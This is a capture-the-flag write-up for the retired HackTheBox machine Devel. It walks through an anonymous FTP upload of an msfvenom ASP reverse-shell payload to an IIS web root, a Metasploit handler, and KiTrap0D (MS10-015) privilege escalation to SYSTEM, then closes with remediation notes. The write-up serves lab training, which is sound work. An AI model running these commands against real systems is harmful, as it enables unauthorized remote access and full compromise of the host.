HTB Devel: anonymous FTP upload to IIS webshell to SYSTEM

retired-machineeasy

Devel is a retired HackTheBox easy Windows machine built around one misconfiguration with two halves. Synopsis: an FTP server with anonymous write access plus an IIS web server serving the same directory over HTTP — together a webshell pipeline.

$ Box info

OS: Windows 7 (IIS 7.5). Difficulty: easy. Address: 10.10.10.5. Services that matter: FTP on 21 (Microsoft ftpd, same directories as the web root) and HTTP on 80 (IIS 7.5). Skills exercised: FTP capability testing, payload-to-stack matching (ASP for IIS), handler discipline, Windows kernel-privesc matching.

$ Skills required

Nmap service enumeration, FTP interaction by hand, msfvenom payload generation, Metasploit multi/handler operation, local exploit suggestion workflow.

$ Enumeration — FTP plus HTTP

# bash: services, then anonymous write
nmap -sC -sV -oN devel.nmap 10.10.10.5
ftp 10.10.10.5
Name: anonymous
ftp> put test.txt
226 Transfer complete.
# nmap: IIS FTP plus IIS web
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
80/tcp open  http    Microsoft IIS httpd 7.5
Service Info: OS: Windows

FTP (IIS-hosted) and HTTP (IIS 7.5) on Windows 7. Anonymous login succeeds — and crucially, uploads succeed too, and uploaded files are served back over HTTP. Write via FTP, execute via HTTP: the whole foothold.

$ Foothold — ASP webshell

# bash: build, upload, trigger ASP shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.23 LPORT=4444 -f asp > shell.asp
ftp 10.10.10.5  # anonymous -> put shell.asp
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.10.14.23; run"
# then browse http://10.10.10.5/shell.asp

The page executes server-side and a session opens as the IIS application-pool user — low privilege, but inside. Match the payload to the stack: ASP for IIS, not PHP.

$ Privilege escalation — KiTrap0D (MS10-015)

# msfconsole: ms10_015_kitrap0d
msf6 > use exploit/windows/local/ms10_015_kitrap0d
msf6 exploit(ms10_015_kitrap0d) > set SESSION 1
msf6 exploit(ms10_015_kitrap0d) > run
[*] Meterpreter session 2 opened as NT AUTHORITY\SYSTEM

Sherlock (or local_exploit_suggester) points at the missing KiTrap0D patch. Both flags fall in the SYSTEM session. Flag values redacted per HTB rules; earn them in your own lab.

$ Dead ends

Uploading a PHP shell out of habit (match the payload to the stack) and triggering the shell before starting the handler (always listeners first, clicks second).

$ Remediation notes

Never allow anonymous FTP write, never serve an upload directory with script execution enabled, and patch kernel privesc CVEs. Written by Lucky Thandel.
